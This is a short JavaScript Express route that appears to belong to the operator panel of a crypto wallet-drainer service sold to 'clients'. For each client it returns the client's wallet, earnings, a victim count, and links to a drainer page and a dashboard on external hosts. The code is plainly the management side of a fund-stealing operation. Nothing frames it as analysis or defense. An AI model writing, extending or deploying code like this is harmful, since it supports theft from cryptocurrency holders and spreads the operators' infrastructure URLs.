
// SAAS Clients API - Get all registered clients for the panel
app.get('/api/saas-clients', (req, res) => {
  try {
    const clientsArray = Array.from(clients.entries()).map(([clientId, client]) => {
      const earnings = clientEarnings.get(clientId) || [];
      const totalEarnings = earnings.reduce((sum, e) => sum + (parseFloat(e.amount) || 0), 0);
      const victimCount = (clientVictims.get(clientId) || []).length;
      
      return {
        clientId,
        projectName: client.name || 'Unknown',
        wallet: client.wallet || 'Not set',
        themeColor: client.themeColor || '#6366f1',
        totalEarnings: totalEarnings.toFixed(4),
        victimCount,
        registrationDate: client.registrationDate || 'Recent',
        drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
        dashboardUrl: `https://service-s816.onrender.com/saas/dashboard/${clientId}`
      };
    });
    
    res.json({
      success: true,
      totalClients: clientsArray.length,
      clients: clientsArray
    });
  } catch (error) {
    console.error('Error fetching SAAS clients:', error);
    res.status(500).json({ error: 'Failed to fetch clients' });
  }
});
